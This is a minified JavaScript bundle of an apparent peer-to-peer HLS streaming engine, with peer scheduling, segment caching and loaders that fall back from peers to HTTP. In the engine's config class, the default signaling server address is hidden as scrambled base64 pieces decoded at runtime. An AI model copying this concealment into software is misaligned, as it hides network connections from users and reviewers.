                            return e.dataExchangeTs - t.dataExchangeTs
                        }), t
                    }
                }, {
                    key: "requestPeers",
                    value: function() {
                        this.logger.info("request peers from peers");
                        var e = {
                            event: h.default.DC_GET_PEERS
                        };
                        this._broadcastToPeers(e)
                    }
                }, {
                    key: "chokePeerRequest",
                    value: function(e) {
                        var t = {
                            event: h.default.DC_CHOKE
                        };
                        e ? e.sendJson(t) : this._broadcastToPeers(t)
                    }
                }, {
                    key: "unchokePeerRequest",
                    value: function(e) {
                        var t = {
                            event: h.default.DC_UNCHOKE
                        };
                        e ? e.sendJson(t) : this._broadcastToPeers(t)
                    }
                }, {
                    key: "stopRequestFromPeers",
                    value: function() {
                        var e = !0,
                            t = !1,
                            n = void 0;
                        try {
                            for (var r, i = this.peerManager.getPeerValues()[Symbol.iterator](); !(e = (r = i.next()).done); e = !0) {
                                r.value.choked = !0
                            }
                        } catch (e) {
                            t = !0, n = e
                        } finally {
                            try {
                                !e && i.return && i.return()
                            } finally {
                                if (t) throw n
                            }
                        }
                    }
                }, {
                    key: "resumeRequestFromPeers",
                    value: function() {
                        var e = !0,
                            t = !1,
                            n = void 0;
                        try {
                            for (var r, i = this.peerManager.getPeerValues()[Symbol.iterator](); !(e = (r = i.next()).done); e = !0) {
                                r.value.choked = !1
                            }
                        } catch (e) {
                            t = !0, n = e
                        } finally {
                            try {
                                !e && i.return && i.return()
                            } finally {
                                if (t) throw n
                            }
                        }
                    }
                }, {
                    key: "setShareOnly",
                    value: function() {
                        this[m] = !0
                    }
                }, {
                    key: "deletePeer",
                    value: function(e) {
                        this.peerManager.hasPeer(e.remotePeerId) && this.peerManager.removePeer(e.remotePeerId), this._peersStats(this.peerManager.getPeerIds())
                    }
                }, {
                    key: "handshakePeer",
                    value: function(e) {
                        this._setupDC(e), e.sendMetaData(Array.from(this.bitset), this.sequential, this.peersNum)
                    }
                }, {
                    key: "getPeers",
                    value: function() {
                        return [].concat(i(this.peerManager.getPeerValues()))
                    }
                }, {
                    key: "addPeer",
                    value: function(e) {
                        var t = this.logger;
                        this.peerManager.addPeer(e.remotePeerId, e), this[m] && (e.choked = !0);
                        var n = this.peerManager.getPeerIds();
                        this._peersStats(n), t.info("add peer " + e.remotePeerId + ", now has " + n.length + " peers"), e.isInitiator && this.peersNum <= 5 && e.peersConnected > 1 && e.sendPeersRequest()
                    }
                }, {
                    key: "peersHas",
                    value: function(e) {
                        return this.bitCounts.has(e)
                    }
                }, {
                    key: "onBufferManagerSegAdded",
                    value: function(e) {}
                }, {
                    key: "destroy",
                    value: function() {
                        var e = this.logger;
                        this.peersNum > 0 && this.peerManager.clear(), this.removeAllListeners(), clearInterval(this.checkConnsTimer), e.warn("destroy BtScheduler")
                    }
                }, {
                    key: "notifyPeersLoaded",
                    value: function(e) {}
                }, {
                    key: "_setupDC",
                    value: function(e) {
                        var t = this,
                            n = this.logger;
                        e.on(h.default.DC_PIECE_ACK, function(r) {
                            r.size && t.engine.fetcher.reportUploaded(r.size), n.info("uploaded " + r.seg_id + " to " + e.remotePeerId)
                        }).on(h.default.DC_TIMEOUT, function(e) {}).on(h.default.DC_PIECE_ABORT, function(r) {
                            n.warn("peer " + e.remotePeerId + " download aborted, reason " + r.reason), e.downloading && t._handlePieceAborted(e.remotePeerId), e.downloading = !1
                        })
                    }
                }, {
                    key: "_broadcastToPeers",
                    value: function(e) {
                        var t = !0,
                            n = !1,
                            r = void 0;
                        try {
                            for (var i, o = this.peerManager.getPeerValues()[Symbol.iterator](); !(t = (i = o.next()).done); t = !0) {
                                i.value.sendJson(e)
                            }
                        } catch (e) {
                            n = !0, r = e
                        } finally {
                            try {
                                !t && o.return && o.return()
                            } finally {
                                if (n) throw r
                            }
                        }
                    }
                }, {
                    key: "_getIdlePeer",
                    value: function() {
                        return this.peerManager.getAvailablePeers()
                    }
                }, {
                    key: "_peersStats",
                    value: function(e) {
                        this.engine.emit("peers", e);
                        var t = this.engine.config.getPeersInfo;
                        t && "function" == typeof t && t(e)
                    }
                }, {
                    key: "_decreBitCounts",
                    value: function(e) {
                        if (this.bitCounts.has(e)) {
                            var t = this.bitCounts.get(e);
                            1 === t ? this.bitCounts.delete(e) : this.bitCounts.set(e, t - 1)
                        }
                    }
                }, {
                    key: "_increBitCounts",
                    value: function(e) {
                        if (this.bitCounts.has(e)) {
                            var t = this.bitCounts.get(e);
                            this.bitCounts.set(e, t + 1)
                        } else this.bitCounts.set(e, 1)
                    }
                }, {
                    key: "reportDCTraffic",
                    value: function(e, t, n) {
                        if (!this.engine.fetcher) return void this.logger.error("DC report failed");
                        var r = this.engine.fetcher,
                            i = t;
                        this.bitset.has(e) && (i *= .5), r.reportDCTraffic(i, n)
                    }
                }, {
                    key: "cleanRequestingMap",
                    value: function(e) {
                        var t = this.peerManager.getPeer(e),
                            n = !0,
                            r = !1,
                            i = void 0;
                        try {
                            for (var o, s = this.requestingMap.internalMap[Symbol.iterator](); !(n = (o = s.next()).done); n = !0) {
                                var a = u(o.value, 2),
                                    l = a[0],
                                    c = a[1];
                                c && c.includes(e) && (this.logger.info("delete " + l + " in requestingMap"), this.requestingMap.delete(l), this._decreBitCounts(l), t && t.bitset.delete(l))
                            }
                        } catch (e) {
                            r = !0, i = e
                        } finally {
                            try {
                                !n && s.return && s.return()
                            } finally {
                                if (r) throw i
                            }
                        }
                    }
                }, {
                    key: "getPeerLoadedMore",
                    value: function(e) {
                        if (!this.requestingMap.has(e)) return null;
                        var t = this.requestingMap.getAllPeerIds(e);
                        if (0 === t.length) return null;
                        var n = this.peerManager.getPeer(t[0]);
                        if (!n) return null;
                        if (t.length > 1)
                            for (var r = 1; r < t.length; r++) {
                                var i = this.peerManager.getPeer(t[r]);
                                i && i.bufArr.length > n.bufArr.length && (n = i)
                            }
                        return n
                    }
                }, {
                    key: "hasPeers",
                    get: function() {
                        return this.peersNum > 0
                    }
                }, {
                    key: "peersNum",
                    get: function() {
                        return this.peerManager.size()
                    }
                }, {
                    key: "hasIdlePeers",
                    get: function() {
                        var e = this._getIdlePeer().length;
                        return this.logger.info("peers: " + this.peersNum + " idle peers: " + e), e > 0
                    }
                }, {
                    key: "bufferManager",
                    set: function(e) {
                        var t = this;
                        this.bufMgr = e, e.on(h.default.BM_LOST, function(e, n, r) {
                            t.config.live || t._broadcastToPeers({
                                event: h.default.DC_LOST,
                                sn: e,
                                seg_id: n
                            }), t.onBufferManagerLost(e, n, r)
                        }).on(h.default.BM_SEG_ADDED, function(e) {
                            t.onBufferManagerSegAdded(e)
                        })
                    }
                }]), t
            }(f.default);
        t.default = _, e.exports = t.default
    }, function(e, t, n) {
        "use strict";

        function r(e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var i = function() {
                function e(e, t) {
                    for (var n = 0; n < t.length; n++) {
                        var r = t[n];
                        r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), Object.defineProperty(e, r.key, r)
                    }
                }
                return function(t, n, r) {
                    return n && e(t.prototype, n), r && e(t, r), t
                }
            }(),
            o = function() {
                function e() {
                    r(this, e), this.internalMap = new Map
                }
                return i(e, [{
                    key: "has",
                    value: function(e) {
                        return this.internalMap.has(e)
                    }
                }, {
                    key: "set",
                    value: function(e, t) {
                        if (this.internalMap.has(e)) {
                            var n = this.internalMap.get(e);
                            if (n) return void n.push(t)
                        }
                        this.internalMap.set(e, [t])
                    }
                }, {
                    key: "setPeerUnknown",
                    value: function(e) {
                        this.internalMap.set(e, null)
                    }
                }, {
                    key: "checkIfPeerUnknown",
                    value: function(e) {
                        return this.internalMap.has(e) && !this.internalMap.get(e)
                    }
                }, {
                    key: "getAllPeerIds",
                    value: function(e) {
                        var t = this.internalMap.get(e);
                        return t || []
                    }
                }, {
                    key: "getOnePeerId",
                    value: function(e) {
                        if (this.internalMap.has(e)) {
                            if (this.internalMap.get(e)) return this.internalMap.get(e)[0]
                        }
                        return null
                    }
                }, {
                    key: "delete",
                    value: function(e) {
                        this.internalMap.delete(e)
                    }
                }]), e
            }();
        t.default = o, e.exports = t.default
    }, function(e, t, n) {
        "use strict";

        function r(e) {
            return e && e.__esModule ? e : {
                default: e
            }
        }

        function i(e) {
            if (Array.isArray(e)) {
                for (var t = 0, n = Array(e.length); t < e.length; t++) n[t] = e[t];
                return n
            }
            return Array.from(e)
        }

        function o(e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
        }

        function s(e, t) {
            if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
            return !t || "object" != typeof t && "function" != typeof t ? e : t
        }

        function a(e, t) {
            if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
            e.prototype = Object.create(t && t.prototype, {
                constructor: {
                    value: e,
                    enumerable: !1,
                    writable: !0,
                    configurable: !0
                }
            }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t)
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var u = function() {
                function e(e, t) {
                    for (var n = 0; n < t.length; n++) {
                        var r = t[n];
                        r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), Object.defineProperty(e, r.key, r)
                    }
                }
                return function(t, n, r) {
                    return n && e(t.prototype, n), r && e(t, r), t
                }
            }(),
            l = n(1),
            c = r(l),
            f = n(3),
            d = r(f),
            h = n(8),
            g = r(h),
            p = 36700160,
            v = function(e) {
                function t(e, n) {
                    var r = !(arguments.length > 2 && void 0 !== arguments[2]) || arguments[2];
                    o(this, t);
                    var i = s(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this));
                    i.isSequential = r, i.logger = n.logger;
                    var a = e.browserInfo.device;
                    return i.maxBufSize = a === g.default.device.PC_WEB || a === g.default.device.PC_NATIVE ? n.memoryCacheLimit.pc : n.memoryCacheLimit.mobile, n.live && (i.maxBufSize = p), i._segPool = new Map, i._currBufSize = 0, i.id2Sn = new Map, i.overflowed = !1, i
                }
                return a(t, e), u(t, [{
                    key: "hasSegOfId",
                    value: function(e) {
                        if (this.isSequential) {
                            var t = this.id2Sn.get(e);
                            return this._segPool.has(t)
                        }
                        return this._segPool.has(e)
                    }
                }, {
                    key: "hasSegOfSN",
                    value: function(e) {
                        return !!this.isSequential && this._segPool.has(e)
                    }
                }, {
                    key: "_calSegPoolSize",
                    value: function() {
                        var e = 0;
                        return this._segPool.forEach(function(t) {
                            e += t.size
                        }), e
                    }
                }, {
                    key: "putSeg",
                    value: function(e) {
                        if (this._currBufSize >= 1.5 * this.maxBufSize && (this._currBufSize = this._calSegPoolSize(), this._currBufSize >= 1.5 * this.maxBufSize && (this.clear(), this.overflowed = !1)), this.isSequential) {
                            if (this._segPool.has(e.sn)) return;
                            this._addSequentialSeg(e)
                        } else {
                            if (this._segPool.has(e.segId)) return;
                            this._addUnsequentialSeg(e)
                        }
                    }
                }, {
                    key: "_addSequentialSeg",
                    value: function(e) {
                        var t = this.logger,
                            n = e.segId,
                            r = e.sn,
                            i = e.size;
                        this.id2Sn.set(n, r), this._segPool.set(r, e), this._currBufSize += parseInt(i);
                        var o = this._segPool.size;
                        if (this.emit("" + d.default.BM_ADDED_SN_ + e.sn, e), this.emit(d.default.BM_SEG_ADDED, e), !(this._currBufSize < this.maxBufSize || o <= 5)) {
                            var s = Array.from(this._segPool.keys()).sort(function(e, t) {
                                    return e - t
                                }),
                                a = 0;
                            do {
                                if (a++ > 10) {
                                    console.error("too much loops in SegmentCache");
                                    break
                                }
                                var u = s.shift();
                                if (void 0 !== u) {
                                    var l = s[0],
                                        c = this._segPool.get(u);
                                    if (c) {
                                        var f = c.size;
                                        this._currBufSize -= parseInt(f), this._segPool.delete(u), this.id2Sn.delete(c.segId), t.info("pop seg " + u + " size " + f + " currBufSize " + this._currBufSize), this.overflowed || (this.overflowed = !0), this.emit(d.default.BM_LOST, u, c.segId, l)
                                    } else t.error("lastSeg not found")
                                } else t.error("lastSN not found")
                            } while (this._currBufSize >= this.maxBufSize && this._segPool.size > 5)
                        }
                    }
                }, {
                    key: "_addUnsequentialSeg",
                    value: function(e) {
                        var t = this.logger,
                            n = e.segId,
                            r = e.size;
                        this._segPool.set(n, e), this._currBufSize += parseInt(r), this.emit("" + d.default.BM_ADDED_SEG_ + e.segId, e), this.emit(d.default.BM_SEG_ADDED, e);
                        for (var o = 0; this._currBufSize >= this.maxBufSize && this._segPool.size > 5;) {
                            if (o++ > 10) {
                                console.error("too much loops in SegmentCache");
                                break
                            }
                            var s = [].concat(i(this._segPool.values())).shift(),
                                a = s.segId,
                                u = s.size;
                            this._currBufSize -= parseInt(u), t.info("pop seg " + a + " size " + u), this._segPool.delete(a), this.overflowed || (this.overflowed = !0), this.emit(d.default.BM_LOST, -1, a)
                        }
                    }
                }, {
                    key: "getSegById",
                    value: function(e) {
                        if (this.isSequential) {
                            var t = this.id2Sn.get(e);
                            return this._segPool.get(t)
                        }
                        return this._segPool.get(e)
                    }
                }, {
                    key: "getSegIdBySN",
                    value: function(e) {
                        var t = this._segPool.get(e);
                        return t ? t.segId : null
                    }
                }, {
                    key: "getSegBySN",
                    value: function(e) {
                        if (this.isSequential) return this._segPool.get(e);
                        throw new Error("fatal error in SegmentCache")
                    }
                }, {
                    key: "clear",
                    value: function() {
                        this.logger.warn("clear segment cache"), this._segPool.clear(), this.id2Sn.clear(), this._currBufSize = 0
                    }
                }, {
                    key: "destroy",
                    value: function() {
                        this.clear(), this.removeAllListeners()
                    }
                }, {
                    key: "currBufSize",
                    get: function() {
                        return this._currBufSize
                    }
                }]), t
            }(c.default);
        t.default = v, e.exports = t.default
    }, function(e, t, n) {
        "use strict";

        function r(e) {
            return e && e.__esModule ? e : {
                default: e
            }
        }

        function i(e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
        }

        function o(e, t) {
            if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
            return !t || "object" != typeof t && "function" != typeof t ? e : t
        }

        function s(e, t) {
            if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
            e.prototype = Object.create(t && t.prototype, {
                constructor: {
                    value: e,
                    enumerable: !1,
                    writable: !0,
                    configurable: !0
                }
            }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t)
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var a = function() {
                function e(e, t) {
                    for (var n = 0; n < t.length; n++) {
                        var r = t[n];
                        r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), Object.defineProperty(e, r.key, r)
                    }
                }
                return function(t, n, r) {
                    return n && e(t.prototype, n), r && e(t, r), t
                }
            }(),
            u = n(1),
            l = r(u),
            c = n(19),
            f = r(c),
            d = n(6),
            h = r(d),
            g = n(0),
            p = n(10),
            v = r(p),
            y = {
                _: "nllL",
                f: "d3NzJ",
                ss: "==",
                3: "TNBLy9z",
                8: "aWduY",
                u: "mNvbQ",
                qa: "WwuY2RuY"
            },
            b = function(e) {
                function t() {
                    var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                    i(this, t);
                    var n = o(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this));
                    if (e.tag && e.tag.length > 20) throw new Error("Tag is too long");
                    if (e.appName && e.appName.length > 30) throw new Error("appName is too long");
                    if (e.appId && e.appId.length > 30) throw new Error("appId is too long");
                    if (e.token && e.token.length > 20) throw new Error("Token is too long");
                    if (e.simultaneousTargetPeers <= 0) throw new Error("simultaneousTargetPeers must >= 1");
                    return n
                }
                return s(t, e), a(t, [{
                    key: "initLogger",
                    value: function() {
                        var e = new f.default(this.config);
                        return this.config.logger = this.logger = e, e
                    }
                }, {
                    key: "makeChannelId",
                    value: function(e, t) {
                        if (!e || "string" != typeof e) throw new Error("channelIdPrefix is required while using customized channelId!");
                        if (e.length < 5) throw new Error("channelIdPrefix length is too short!");
                        if (e.length > 15) throw new Error("channelIdPrefix length is too long!");
                        return function(n, r) {
                            return e + t(n, r)
                        }
                    }
                }, {
                    key: "makeSignalId",
                    value: function() {
                        var e = void 0;
                        return this.config.wsSignalerAddr ? e = h.default.parseURL(this.config.wsSignalerAddr).netLoc.substr(2) : (this.config.wsSignalerAddr = decodeURIComponent(window.atob(y.f + y[3] + y[8] + y.qa + y._ + y.u + y.ss)), e = ""), e
                    }
                }, {
                    key: "setupWindowListeners",
                    value: function() {
                        var e = this,
                            t = ["iPad", "iPhone"].indexOf(navigator.platform) >= 0,
                            n = t ? "pagehide" : "beforeunload";
                        window.addEventListener(n, function() {
                            e.p2pEnabled && e.disableP2P()
                        })
                    }
                }, {
                    key: "destroy",
                    value: function() {
                        this.disableP2P(), this.removeAllListeners()
                    }
                }, {
                    key: "enableP2P",
                    value: function() {
                        return this.p2pEnabled ? null : (this.logger.info("enable P2P"), this.config.p2pEnabled = this.p2pEnabled = !0, this._init(this.channel, this.browserInfo), this)
                    }
                }, {
                    key: "version",
                    get: function() {
                        return t.version
                    }
                }], [{
                    key: "isSupported",
                    value: function() {
                        var e = (0, g.getBrowserRTC)();
                        return e && void 0 !== e.RTCPeerConnection.prototype.createDataChannel
                    }
                }]), t
            }(l.default);
        b.version = "1.17.0", b.protocolVersion = v.default.VERSION, t.default = b, e.exports = t.default
    }, function(e, t, n) {
        "use strict";

        function r(e) {
            return e && e.__esModule ? e : {
                default: e
            }
        }

        function i(e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
        }

        function o(e, t) {
            if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
            return !t || "object" != typeof t && "function" != typeof t ? e : t
        }

        function s(e, t) {
            if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
            e.prototype = Object.create(t && t.prototype, {
                constructor: {
                    value: e,
                    enumerable: !1,
                    writable: !0,
                    configurable: !0
                }
            }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t)
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var a = function() {
                function e(e, t) {
                    for (var n = 0; n < t.length; n++) {
                        var r = t[n];
                        r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), Object.defineProperty(e, r.key, r)
                    }
                }
                return function(t, n, r) {
                    return n && e(t.prototype, n), r && e(t, r), t
                }
            }(),
            u = n(1),
            l = r(u),
            c = n(5),
            f = n(2),
            d = n(12),
            h = r(d),
            g = n(4),
            p = n(9),
            v = r(p),
            y = function(e) {
                function t(e) {
                    i(this, t);
                    var n = o(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this));
                    n.logger = e.logger;
                    var r = window.__p2p_loader__,
                        s = r.scheduler,
                        a = r.fetcher,
                        u = r.p2pBlackList;
                    return n.isHlsV0 = e.isHlsV0, n.bufMgr = e.bufMgr, n.xhrLoader = new e.loader(e), n.p2pEnabled = e.p2pEnabled, n.isLive = e.live, n.scheduler = s, n.fetcher = a, n.segmentId = e.segmentId, n.blockTypes = u, n.forbidden = a.forbidden, n.multiBitrate = n.scheduler instanceof h.default, n.stats = n.xhrLoader.stats || (0, c.createLoadStats)(), n.waitTimer = null, n
                }
                return s(t, e), a(t, [{
                    key: "destroy",
                    value: function() {
                        this.xhrLoader.destroy()
                    }
                }, {
                    key: "abort",
                    value: function() {
                        this.xhrLoader.abort()
                    }
                }, {
                    key: "load",
                    value: function(e, t, n) {
                        var r = this,
                            i = this.logger,
                            o = this.scheduler,
                            s = e.frag;
                        this.isHlsV0 || (s.stats = this.stats);
                        var a = e.frag.segId;
                        if (!a) {
                            var u = void 0;
                            e.rangeEnd && (u = "bytes=" + e.rangeStart + "-" + (e.rangeEnd - 1)), a = e.frag.segId = this.segmentId(s.baseurl, s.sn, s.url, u)
                        }
                        if ((0, c.isBlockType)(s.url, this.blockTypes)) {
                            i.info("HTTP load blockType " + s.url), e.frag.loadByHTTP = !0;
                            var l = n.onSuccess;
                            return n.onSuccess = function(e, t, n) {
                                i.info("HTTP load time " + (t.tload - t.trequest) + "ms"), l(e, t, n)
                            }, this.xhrLoader.load(e, t, n)
                        }
                        if (!this.forbidden)
                            if (t.maxRetry = 2, this.p2pEnabled && this.bufMgr.hasSegOfId(a)) {
                                i.info("bufMgr found seg sn " + s.sn + " segId " + a);
                                var d = this.bufMgr.getSegById(a),
                                    h = f.Buffer.from(d.data),
                                    p = new f.Buffer(d.data.byteLength);
                                h.copy(p);
                                var y = new Uint8Array(p).buffer,
                                    b = {
                                        url: e.url,
                                        data: y
                                    };
                                (0, c.updateLoadStats)(this.stats, d.size), s.loaded = d.size, s.loadByP2P = !0, e.frag.fromPeerId = d.fromPeerId, (0, g.queueMicrotask)(function() {
                                    !r.isHlsV0 && n.onProgress && n.onProgress(r.stats, e, b.data), n.onSuccess(b, r.stats, e)
                                })
                            } else if (this.p2pEnabled && o.hasAndSetTargetPeer(this.multiBitrate ? s.segId : s.sn)) this.loadFragByP2p(e, t, n, a);
                        else {
                            var m = o.mBufferedDuration;
                            if (i.info("fragLoader load " + a + " at " + s.sn + " level " + s.level + " buffered " + m), this.isLive && o.hasIdlePeers && m > 6.5 && o.shouldWaitForNextSeg()) {
                                var _ = m - 6.5;
                                _ > 5.5 && (_ = 5.5);
                                var P = function i(u) {
                                    a === u && (o.off(v.default.SCH_DCHAVE, i), clearTimeout(r.waitTimer), o.hasAndSetTargetPeer(r.multiBitrate ? s.segId : s.sn) ? r.loadFragByP2p(e, t, n, a) : r.loadFragByHttp(e, t, n, a))
                                };
                                i.info("wait peer have for " + _ + "s"), o.on(v.default.SCH_DCHAVE, P), this.waitTimer = setTimeout(function() {
                                    o.notifyAllPeers(s.sn, a), r.loadFragByHttp(e, t, n, a), o.off(v.default.SCH_DCHAVE, P)
                                }, 1e3 * _)
                            } else this.loadFragByHttp(e, t, n, a)
                        }
                    }
                }, {
                    key: "loadFragByHttp",
                    value: function(e, t, n, r) {
                        var i = this;
                        this.scheduler.isReceiver = !1;
                        var o = this.logger,
                            s = e.frag,
                            a = n.onSuccess;
                        n.onSuccess = function(e, t, n) {
                            if (!i.bufMgr.hasSegOfId(r)) {
                                var u = f.Buffer.from(e.data),
                                    l = new f.Buffer(e.data.byteLength);
                                u.copy(l);
                                var c = new f.Segment(s.sn, r, l, i.fetcher.peerId);
                                i.bufMgr.putSeg(c)
                            }
                            i.fetcher.reportFlow(t.total), o.info("HTTP loaded " + r + " time " + (t.tload - t.trequest) + "ms"), a(e, t, n)
                        }, e.frag.loadByHTTP = !0, this.xhrLoader.load(e, t, n)
                    }
                }, {
                    key: "loadFragByP2p",
                    value: function(e, t, n, r) {
                        var i = this,
                            o = this.logger,
                            s = e.frag;
                        this.scheduler.load(e, t, n);
                        var a = n.onTimeout;
                        n.onTimeout = function(e, r) {
                            o.warn("P2P timeout switched to HTTP load " + s.relurl + " at " + s.sn), i.xhrLoader.load(r, t, n), n.onTimeout = a
                        };
                        var u = n.onSuccess;
                        n.onSuccess = function(e, t, a) {
                            if (n.onSuccess = function() {
                                    o.warn("p2p loaded " + s.sn + ", http ignore")
                                }, !i.bufMgr.hasSegOfId(r)) {
                                var l = f.Buffer.from(e.data),
                                    c = new f.Buffer(e.data.byteLength);
                                l.copy(c);
                                var d = new f.Segment(s.sn, r, c, s.fromPeerId || i.fetcher.peerId);
                                i.bufMgr.putSeg(d)
                            }
                            s.loadByP2P || i.fetcher.reportFlow(t.total), s.loaded = t.loaded, o.info((s.loadByP2P ? "P2P" : "HTTP") + " loaded segment id " + r), !i.isHlsV0 && n.onProgress && n.onProgress(t, a, e.data), u(e, t, a)
                        }
                    }
                }]), t
            }(l.default);
        t.default = y, e.exports = t.default
    }, function(e, t, n) {
        "use strict";

        function r(e) {
            return e && e.__esModule ? e : {
                default: e
            }
        }

        function i(e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
        }

        function o(e, t) {
            if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
            return !t || "object" != typeof t && "function" != typeof t ? e : t
        }

        function s(e, t) {
            if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
            e.prototype = Object.create(t && t.prototype, {
                constructor: {
                    value: e,
                    enumerable: !1,
                    writable: !0,
                    configurable: !0
                }
            }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t)
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var a = function() {
                function e(e, t) {
                    for (var n = 0; n < t.length; n++) {
                        var r = t[n];
                        r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), Object.defineProperty(e, r.key, r)
                    }
                }
                return function(t, n, r) {
                    return n && e(t.prototype, n), r && e(t, r), t
                }
            }(),
            u = n(1),
            l = r(u),
            c = n(12),
            f = r(c),
            d = n(4),
            h = n(5),
            g = function(e) {
                function t(e) {
                    i(this, t);
                    var n = o(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this));
                    n.logger = e.logger;
                    var r = window.__p2p_loader__.scheduler;
                    return n.isHlsV0 = e.isHlsV0, n.xhrLoader = new e.loader(e), n.p2pEnabled = e.p2pEnabled, n.scheduler = r, n.multiBitrate = n.scheduler instanceof f.default, n.stats = n.xhrLoader.stats || (0, h.createLoadStats)(), n
                }
                return s(t, e), a(t, [{
                    key: "destroy",
                    value: function() {
                        this.xhrLoader.destroy()
                    }
                }, {
                    key: "abort",
                    value: function() {
                        this.xhrLoader.abort()
                    }
                }, {
                    key: "load",
                    value: function(e, t, n) {
                        var r = this,
                            i = this.logger,
                            o = e.url,
                            s = o.split("?")[0];
                        if (this.scheduler.playlistInfo.has(s)) {
                            var a = this.scheduler.getPlaylistFromPeer(s);
                            if (a && a.data) {
                                var u = a.data;
                                i.info("got playlist from peer length " + u.length), (0, h.updateLoadStats)(this.stats, u.length);
                                var l = {
                                    url: o,
                                    data: u
                                };
                                return void(0, d.queueMicrotask)(function() {
                                    n.onSuccess(l, r.stats, e)
                                })
                            }
                        }
                        this.xhrLoader.load(e, t, n);
                        var c = n.onSuccess;
                        n.onSuccess = function(e, t, n) {
                            r.scheduler.broadcastPlaylist(s, e.data), c(e, t, n)
                        }
                    }
                }]), t
            }(l.default);
        t.default = g, e.exports = t.default
    }, function(e, t, n) {
        "use strict";

        function r(e) {
            return e && e.__esModule ? e : {
                default: e
            }
        }

        function i(e) {
            if (Array.isArray(e)) {
                for (var t = 0, n = Array(e.length); t < e.length; t++) n[t] = e[t];
                return n
            }
            return Array.from(e)
        }

        function o(e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
        }

        function s(e, t) {
            if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
            return !t || "object" != typeof t && "function" != typeof t ? e : t
        }

        function a(e, t) {
            if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
            e.prototype = Object.create(t && t.prototype, {
                constructor: {
                    value: e,
                    enumerable: !1,
                    writable: !0,
                    configurable: !0
                }
            }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t)
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var u = function() {
                function e(e, t) {
                    for (var n = 0; n < t.length; n++) {
                        var r = t[n];
                        r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), Object.defineProperty(e, r.key, r)
                    }
                }
                return function(t, n, r) {
                    return n && e(t.prototype, n), r && e(t, r), t
                }
            }(),
            l = function e(t, n, r) {
                null === t && (t = Function.prototype);
                var i = Object.getOwnPropertyDescriptor(t, n);
                if (void 0 === i) {
                    var o = Object.getPrototypeOf(t);
                    return null === o ? void 0 : e(o, n, r)
                }
                if ("value" in i) return i.value;
                var s = i.get;
                if (void 0 !== s) return s.call(r)
            },
            c = n(2),
            f = n(9),
            d = r(f),
            h = n(0),
            g = n(20),
            p = r(g),
            v = n(37),
            y = r(v),
            b = n(5),
            m = n(4),
            _ = 150,
            P = 3,
            w = function(e) {
                function t(e, n) {
                    o(this, t);
                    var r = s(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this, e, n));
                    return r.logger.info("use SnScheduler"), r.sequential = !0, r.currPlaySN = 0, r.currLostSN = -1, r.nextLostSN = -1, r.checkTimer = null, r.loadedPeerNum = 0, r.config.live ? r.maxPrefetchCount = P : (r.maxPrefetchCount = _, r.startCheckPeersTimer()), r.waitForPeer = n.waitForPeer || !1, r.waitingPeers = 0, r.waitForPeer && (r.waitForPeerTimer = setTimeout(function() {
                        r.waitForPeer = !1
                    }, 1e3 * (n.waitForPeerTimeout + 2))), r.estimatedSize = 1e6, r
                }
                return a(t, e), u(t, [{
                    key: "startCheckPeersTimer",
                    value: function() {
                        var e = this,
                            t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 1;
                        this.logger.info("loaded peers " + this.loadedPeerNum + " next checkDelay is " + t), this.loadedPeerNum = 0, this.checkTimer || (this.checkTimer = setTimeout(function() {
                            e.checkPeers(), e.checkTimer = null, e.startCheckPeersTimer((0, h.calCheckPeersDelay)(e.loadedPeerNum))
                        }, 1e3 * t))
                    }
                }, {
                    key: "notifySubscribeLevel",
                    value: function() {
                        var e = this;
                        this.subscribers.forEach(function(t) {
                            var n = e.peerManager.getPeer(t);
                            n && n.sendSubscribeLevel(e.subscribeLevel)
                        })
                    }
                }, {
                    key: "updatePlaySN",
                    value: function(e) {
                        this.currPlaySN = e
                    }
                }, {
                    key: "checkPeers",
                    value: function() {
                        var e = this.logger,
                            t = this.config;
